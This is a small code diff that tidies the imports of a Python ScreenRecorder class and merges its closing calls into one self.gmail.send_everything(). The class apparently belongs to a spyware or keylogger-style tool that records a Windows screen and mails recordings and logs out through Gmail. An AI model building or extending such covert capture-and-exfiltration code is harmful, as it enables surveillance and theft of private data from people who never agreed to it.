@@ -1,8 +1,9 @@
-import cv2
-from pyautogui import screenshot
-from numpy import array
-from win32api import GetSystemMetrics
 from threading import Thread
+
+import cv2
+from numpy import array
+from pyautogui import screenshot
+from win32api import GetSystemMetrics
 
 
 class ScreenRecorder:
@@ -32,5 +33,4 @@ class ScreenRecorder:
         video_writer.release()
         cv2.destroyAllWindows()
 
-        self.gmail.send_logs()
-        self.gmail.send_recording()
+        self.gmail.send_everything()
